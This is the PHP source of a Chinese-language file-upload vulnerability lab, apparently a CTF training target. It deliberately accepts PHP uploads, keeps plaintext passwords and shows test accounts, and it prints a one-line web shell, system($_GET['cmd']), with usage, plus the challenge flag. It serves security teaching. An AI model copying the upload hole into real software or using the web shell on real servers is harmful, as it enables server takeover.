<?php
session_start();

// 数据库连接
$host = getenv('DB_HOST') ?: 'db';
$dbname = getenv('DB_NAME') ?: 'upload_lab';
$username = getenv('DB_USER') ?: 'root';
$password = getenv('DB_PASS') ?: '123456';

try {
    $pdo = new PDO("mysql:host=$host;dbname=$dbname;charset=utf8", $username, $password);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch(PDOException $e) {
    die("连接失败: " . $e->getMessage());
}

// 步骤控制变量
$step = isset($_GET['step']) ? intval($_GET['step']) : 1;
if ($step < 1) $step = 1;
if ($step > 3) $step = 3;

// 处理登录
$current_user = null;
$error = '';
$success = false;

if ($_POST && isset($_POST['login'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
    $stmt->execute([$username, $password]);
    $user = $stmt->fetch();
    
    if ($user) {
        $_SESSION['user'] = $user;
        header("Location: index.php?step=$step");
        exit();
    } else {
        $error = "用户名或密码错误";
    }
}

// 处理文件上传
if ($_POST && isset($_POST['upload']) && isset($_SESSION['user']) && isset($_FILES['file'])) {
    $upload_dir = 'uploads/';
    $file = $_FILES['file'];
    
    // 检查文件是否上传成功
    if ($file['error'] === UPLOAD_ERR_OK) {
        $original_name = $file['name'];
        $file_size = $file['size'];
        $file_type = $file['type'];
        
        // 生成唯一文件名
        $extension = pathinfo($original_name, PATHINFO_EXTENSION);
        $filename = uniqid() . '.' . $extension;
        $upload_path = $upload_dir . $filename;
        
        // 检查文件类型（故意不严格，用于实验）
        $allowed_types = ['jpg', 'jpeg', 'png', 'gif', 'txt', 'php', 'php3', 'php4', 'php5', 'phtml'];
        $file_extension = strtolower($extension);
        
        if (in_array($file_extension, $allowed_types)) {
            if (move_uploaded_file($file['tmp_name'], $upload_path)) {
                // 记录到数据库
                $stmt = $pdo->prepare("INSERT INTO files (filename, original_name, file_size, file_type, uploaded_by) VALUES (?, ?, ?, ?, ?)");
                $stmt->execute([$filename, $original_name, $file_size, $file_type, $_SESSION['user']['username']]);
                
                $success = "文件上传成功！";
                
                // 检查是否成功
                switch ($step) {
                    case 1:
                        // 基础文件上传 - PHP文件
                        if ($file_extension == 'php') {
                            $success = "文件上传成功！挑战完成！";
                        }
                        break;
                    case 2:
                        // 绕过文件类型检查
                        if (strpos($original_name, '.php') !== false) {
                            $success = "文件上传成功！挑战完成！";
                        }
                        break;
                    case 3:
                        // Web Shell上传
                        if ($file_extension == 'php' && strpos(file_get_contents($upload_path), 'system') !== false) {
                            $success = "文件上传成功！挑战完成！";
                        }
                        break;
                }
            } else {
                $error = "文件上传失败";
            }
        } else {
            $error = "不允许的文件类型";
        }
    } else {
        $error = "文件上传错误";
    }
}

// 获取已上传的文件列表
$files = [];
if (isset($_SESSION['user'])) {
    $stmt = $pdo->query("SELECT * FROM files ORDER BY upload_time DESC");
    $files = $stmt->fetchAll(PDO::FETCH_ASSOC);
}

// 步骤标题和说明
$steps = [
    1 => [
        'title' => '基础文件上传 - PHP文件',
        'desc' => '文件上传漏洞允许攻击者上传恶意文件到服务器。尝试上传一个PHP文件来验证漏洞。',
        'hint' => "尝试上传一个.php文件",
        'goal' => '目标：上传PHP文件到服务器',
        'form_label' => '文件上传'
    ],
    2 => [
        'title' => '绕过文件类型检查',
        'desc' => '一些网站会检查文件扩展名，但检查不够严格。尝试绕过文件类型限制。',
        'hint' => "尝试修改文件名或使用特殊字符",
        'goal' => '目标：绕过文件类型检查上传PHP文件',
        'form_label' => '文件上传'
    ],
    3 => [
        'title' => 'Web Shell上传',
        'desc' => 'Web Shell是一种恶意脚本，可以让攻击者远程控制服务器。尝试上传一个包含系统命令的PHP文件。',
        'hint' => "上传包含system()函数的PHP文件",
        'goal' => '目标：上传Web Shell并执行系统命令',
        'form_label' => 'Web Shell上传'
    ]
];

// 检查是否成功
if (isset($_GET['success'])) {
    $success = $_GET['success'] == '1';
}
?>

<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>文件上传漏洞实验 - 步骤 <?php echo $step; ?></title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 1000px;
            margin: 0 auto;
            padding: 20px;
            background-color: #0f172a;
            color: #e2e8f0;
        }
        .container {
            background: #1e293b;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
            margin-bottom: 20px;
        }
        h1 {
            color: #38bdf8;
            text-align: center;
            margin-bottom: 30px;
        }
        h2 {
            color: #22d3ee;
            border-bottom: 2px solid #38bdf8;
            padding-bottom: 10px;
        }
        .step-navigation {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
        }
        .btn {
            background-color: #64748b;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            text-decoration: none;
            text-align: center;
            flex: 1;
            margin: 0 5px;
            transition: background-color 0.3s;
        }
        .btn:hover {
            background-color: #38bdf8;
        }
        .btn.active {
            background-color: #2563eb;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            color: #94a3b8;
        }
        input[type="text"], input[type="password"], input[type="file"] {
            width: 100%;
            padding: 8px;
            border: 1px solid #475569;
            border-radius: 4px;
            box-sizing: border-box;
            background-color: #334155;
            color: #e2e8f0;
        }
        button {
            background-color: #38bdf8;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #2563eb;
        }
        .error {
            color: #ef4444;
            margin-bottom: 10px;
        }
        .success {
            color: #10b981;
            margin-bottom: 10px;
        }
        .warning {
            background-color: #dc2626;
            border: 1px solid #ef4444;
            color: #fecaca;
            padding: 10px;
            border-radius: 4px;
            margin-bottom: 20px;
        }
        .file-item {
            border: 1px solid #475569;
            padding: 10px;
            margin: 10px 0;
            border-radius: 4px;
            background-color: #334155;
        }
        .file-link {
            color: #38bdf8;
            text-decoration: none;
        }
        .file-link:hover {
            text-decoration: underline;
        }
        .goal-box {
            background-color: rgba(59, 130, 246, 0.1);
            border-left: 4px solid #38bdf8;
            padding: 12px;
            margin: 16px 0;
            font-weight: bold;
        }
        .success-message {
            background-color: rgba(16, 185, 129, 0.1);
            border-left: 4px solid #10b981;
            padding: 15px;
            margin: 16px 0;
            animation: fadeIn 0.5s;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .hint {
            background-color: rgba(245, 158, 11, 0.1);
            border-left: 4px solid #f59e0b;
            padding: 12px;
            margin: 16px 0;
        }
        .nav {
            margin-bottom: 20px;
        }
        .nav a {
            color: #38bdf8;
            text-decoration: none;
        }
        .nav a:hover {
            text-decoration: underline;
        }
        .flag-container {
            background-color: #1a1e2e;
            border: 2px solid #38bdf8;
            border-radius: 8px;
            padding: 15px;
            margin: 20px 0;
            text-align: center;
            animation: glow 2s infinite alternate;
        }
        @keyframes glow {
            from { box-shadow: 0 0 5px #38bdf8; }
            to { box-shadow: 0 0 20px #38bdf8; }
        }
        .user-info {
            background-color: #334155;
            padding: 15px;
            border-radius: 4px;
            margin-bottom: 20px;
        }
        pre {
            background-color: #334155;
            padding: 15px;
            border-radius: 4px;
            overflow-x: auto;
            border: 1px solid #475569;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>文件上传漏洞实验</h1>
        
        <div class="nav">
            <a href="index.html">&larr; 返回靶机控制台</a>
        </div>
        
        <div class="warning">
            <strong>⚠️ 安全警告：</strong>这是一个用于学习文件上传漏洞的实验环境。请勿在生产环境中使用。
        </div>

        <!-- 步骤导航 -->
        <div class="step-navigation">
            <?php foreach ([1,2,3] as $i): ?>
                <a href="?step=<?php echo $i; ?>" class="btn <?php echo $i == $step ? 'active' : ''; ?>">第<?php echo $i; ?>步</a>
            <?php endforeach; ?>
        </div>

        <div class="container">
            <h2><?php echo $steps[$step]['title']; ?></h2>
            <p><?php echo $steps[$step]['desc']; ?></p>

            <div class="goal-box">
                <?php echo $steps[$step]['goal']; ?>
            </div>

            <?php if ($success && $step < 3): ?>
                <div class="success-message">
                    <h3>🎓 挑战成功！</h3>
                    <p>恭喜！你成功完成了本步骤的挑战。</p>
                    <a href="?step=<?php echo $step + 1; ?>" class="btn">继续下一步</a>
                </div>
            <?php endif; ?>

            <?php if (!isset($_SESSION['user'])): ?>
                <!-- 登录表单 -->
                <h3>用户登录</h3>
                <?php if ($error): ?>
                    <div class="error"><?php echo $error; ?></div>
                <?php endif; ?>
                
                <form method="POST" action="?step=<?php echo $step; ?>">
                    <div class="form-group">
                        <label for="username">用户名:</label>
                        <input type="text" id="username" name="username" required>
                    </div>
                    <div class="form-group">
                        <label for="password">密码:</label>
                        <input type="password" id="password" name="password" required>
                    </div>
                    <button type="submit" name="login">登录</button>
                </form>

                <h3>测试账户</h3>
                <ul>
                    <li>admin / admin123</li>
                    <li>user1 / password123</li>
                    <li>test / test123</li>
                </ul>

            <?php else: ?>
                <!-- 用户信息 -->
                <div class="user-info">
                    <h3>欢迎，<?php echo htmlspecialchars($_SESSION['user']['username']); ?>！</h3>
                    <a href="?logout=1" style="color: #ef4444;">退出登录</a>
                </div>

                <?php if ($error): ?>
                    <div class="error"><?php echo $error; ?></div>
                <?php endif; ?>
                
                <?php if ($success): ?>
                    <div class="success"><?php echo $success; ?></div>
                <?php endif; ?>

                <!-- 文件上传表单 -->
                <h3><?php echo $steps[$step]['form_label']; ?></h3>
                <form method="POST" action="?step=<?php echo $step; ?>" enctype="multipart/form-data">
                    <div class="form-group">
                        <label for="file">选择文件:</label>
                        <input type="file" id="file" name="file" required>
                    </div>
                    <button type="submit" name="upload">上传文件</button>
                </form>

                <!-- 文件列表 -->
                <h3>已上传的文件</h3>
                <?php if (empty($files)): ?>
                    <p>暂无上传文件</p>
                <?php else: ?>
                    <?php foreach ($files as $file): ?>
                        <div class="file-item">
                            <strong>文件名:</strong> <?php echo htmlspecialchars($file['original_name']); ?><br>
                            <strong>大小:</strong> <?php echo number_format($file['file_size']); ?> bytes<br>
                            <strong>类型:</strong> <?php echo htmlspecialchars($file['file_type']); ?><br>
                            <strong>上传者:</strong> <?php echo htmlspecialchars($file['uploaded_by']); ?><br>
                            <strong>上传时间:</strong> <?php echo $file['upload_time']; ?><br>
                            <strong>访问链接:</strong> 
                            <a href="uploads/<?php echo htmlspecialchars($file['filename']); ?>" target="_blank" class="file-link">
                                <?php echo htmlspecialchars($file['filename']); ?>
                            </a>
                        </div>
                    <?php endforeach; ?>
                <?php endif; ?>

                <?php if ($success && $step == 3): ?>
                    <div class="flag-container">
                        <h2>🏁 恭喜你完成所有挑战！</h2>
                        <p style="font-size:1.2em;color:#22d3ee;font-weight:bold;">Flag: <code>flag{file_upload_master_2024}</code></p>
                        <p style="color:#38bdf8;">将此Flag提交到CTF平台以获得积分</p>
                    </div>
                <?php endif; ?>

                <h3>文件上传漏洞实验提示</h3>
                <p>尝试上传以下类型的文件来测试漏洞：</p>
                <ul>
                    <li>PHP Web Shell: <code>&lt;?php system($_GET['cmd']); ?&gt;</code></li>
                    <li>图片马: 在图片中嵌入PHP代码</li>
                    <li>绕过文件类型检查: 修改文件扩展名</li>
                    <li>绕过内容检查: 使用特殊字符或编码</li>
                </ul>

                <h3>示例PHP Web Shell</h3>
                <pre><code>&lt;?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?&gt;</code></pre>
                <p>上传后访问: <code>uploads/[filename]?cmd=ls</code></p>
            <?php endif; ?>

            <div class="hint">
                <h3>提示：</h3>
                <p><?php echo $steps[$step]['hint']; ?></p>
            </div>
        </div>

        <div class="container">
            <h3>文件上传漏洞技巧</h3>
            <p>文件上传漏洞是一种常见的Web安全漏洞，了解以下技巧会很有帮助：</p>
            <ul>
                <li>检查文件扩展名和MIME类型</li>
                <li>使用Web Shell获取服务器控制权</li>
                <li>绕过文件类型检查机制</li>
                <li>利用文件包含漏洞执行恶意代码</li>
            </ul>
        </div>
    </div>
</body>
</html>

<?php
// 处理退出登录
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: index.php?step=$step");
    exit();
}
?> 